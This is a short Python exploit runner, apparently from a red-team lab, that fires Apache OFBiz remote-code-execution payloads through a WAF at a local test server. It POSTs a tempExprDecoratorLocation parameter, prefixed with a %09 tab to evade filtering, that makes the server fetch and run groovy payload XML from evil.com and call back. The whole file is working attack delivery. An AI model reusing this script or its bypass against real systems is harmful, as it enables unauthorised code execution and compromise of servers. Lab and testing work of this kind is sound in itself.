# -*- coding: utf-8 -*-
"""Joint-round runner: OFBiz rt4 brace-free groovy weapons through the WAF entry (18381).

rt4_fire*.py are frozen on 18081 and must not be edited; this runner replays their
bodies (payloads already in infrastructure/www/payloads) against 18381 with the
same %09 leading-whitespace delivery."""
import sys

import requests  # noqa: E402
import urllib3  # noqa: E402

urllib3.disable_warnings()

TARGET = "https://127.0.0.1:18381"
URI = "/webtools/control/main/findTemporalExpression"

SHOTS = [
    ("rt4 pure-java groovy (rt4_ofbiz.xml: app-tree + hsperfdata + callback)",
     "tempExprDecoratorLocation=%09http://evil.com:8000/payloads/rt4_ofbiz.xml"),
    ("rt4 brace-free groovy (rt4_ofbiz2.xml: tree-write + hsperfdata + callback)",
     "tempExprDecoratorLocation=%09http://evil.com:8000/payloads/rt4_ofbiz2.xml"),
]

s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"

for label, body in SHOTS:
    r = s.post(TARGET + URI, data=body,
               headers={"Content-Type": "application/x-www-form-urlencoded"},
               timeout=90, allow_redirects=False)
    print("[*] %s -> HTTP %s (%dB)" % (label, r.status_code, len(r.content)))
